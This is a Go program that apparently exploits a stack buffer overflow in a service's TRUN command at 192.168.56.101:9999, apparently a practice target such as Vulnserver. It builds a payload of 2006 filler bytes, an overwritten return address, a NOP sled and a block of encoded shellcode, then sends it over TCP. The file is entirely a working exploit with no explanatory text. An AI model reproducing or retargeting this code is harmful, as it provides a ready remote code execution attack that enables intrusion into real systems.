package main

import (
    "fmt"
    "net"
    "strings" //Gives me ability to repeat a string
 )
 
 func main() {
 
    fmt.Println("[*] Connecting to Target")
    
    conn, err := net.Dial("tcp", "192.168.56.101:9999")
    if err != nil {
        fmt.Println("[!] There was an error connecting")
        fmt.Println("=====================================")
        fmt.Println(err)
        return
    }
    
    fuzz := strings.Repeat("A", 2006)
    eip := "\xaf\x11\x50\x62"
    //eip := "BBBB"
    nopSled := strings.Repeat("\x90", 16)
    padding := strings.Repeat("C", 623)
    
    shellcode := ("\xbd\xba\xf7\xc8\x34\xdb\xde\xd9\x74\x24\xf4\x5a\x33\xc9" +
            "\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\x78\xf3\x2a\xc1\x80" +
            "\x14\x28\x2a\x78\xe5\x4d\xa2\x9d\xd4\x4d\xd0\xd6\x47\x7e" +
            "\x92\xba\x6b\xf5\xf6\x2e\xff\x7b\xdf\x41\x48\x31\x39\x6c" +
            "\x49\x6a\x79\xef\xc9\x71\xae\xcf\xf0\xb9\xa3\x0e\x34\xa7" +
            "\x4e\x42\xed\xa3\xfd\x72\x9a\xfe\x3d\xf9\xd0\xef\x45\x1e" +
            "\xa0\x0e\x67\xb1\xba\x48\xa7\x30\x6e\xe1\xee\x2a\x73\xcc" +
            "\xb9\xc1\x47\xba\x3b\x03\x96\x43\x97\x6a\x16\xb6\xe9\xab" +
            "\x91\x29\x9c\xc5\xe1\xd4\xa7\x12\x9b\x02\x2d\x80\x3b\xc0" +
            "\x95\x6c\xbd\x05\x43\xe7\xb1\xe2\x07\xaf\xd5\xf5\xc4\xc4" +
            "\xe2\x7e\xeb\x0a\x63\xc4\xc8\x8e\x2f\x9e\x71\x97\x95\x71" +
            "\x8d\xc7\x75\x2d\x2b\x8c\x98\x3a\x46\xcf\xf4\x8f\x6b\xef" +
            "\x04\x98\xfc\x9c\x36\x07\x57\x0a\x7b\xc0\x71\xcd\x7c\xfb" +
            "\xc6\x41\x83\x04\x37\x48\x40\x50\x67\xe2\x61\xd9\xec\xf2" +
            "\x8e\x0c\xa2\xa2\x20\xff\x03\x12\x81\xaf\xeb\x78\x0e\x8f" +
            "\x0c\x83\xc4\xb8\xa7\x7e\x8f\x06\x9f\xb8\x29\xef\xe2\xb8" +
            "\xb4\x54\x6b\x5e\xdc\xba\x3a\xc9\x49\x22\x67\x81\xe8\xab" +
            "\xbd\xec\x2b\x27\x32\x11\xe5\xc0\x3f\x01\x92\x20\x0a\x7b" +
            "\x35\x3e\xa0\x13\xd9\xad\x2f\xe3\x94\xcd\xe7\xb4\xf1\x20" +
            "\xfe\x50\xec\x1b\xa8\x46\xed\xfa\x93\xc2\x2a\x3f\x1d\xcb" +
            "\xbf\x7b\x39\xdb\x79\x83\x05\x8f\xd5\xd2\xd3\x79\x90\x8c" +
            "\x95\xd3\x4a\x62\x7c\xb3\x0b\x48\xbf\xc5\x13\x85\x49\x29" +
            "\xa5\x70\x0c\x56\x0a\x15\x98\x2f\x76\x85\x67\xfa\x32\xb5" +
            "\x2d\xa6\x13\x5e\xe8\x33\x26\x03\x0b\xee\x65\x3a\x88\x1a" +
            "\x16\xb9\x90\x6f\x13\x85\x16\x9c\x69\x96\xf2\xa2\xde\x97" +
            "\xd6")

    payload := "TRUN ." + fuzz + eip + nopSled + shellcode + padding
    
    fmt.Fprintf(conn, payload)
    conn.Close()
    
 }
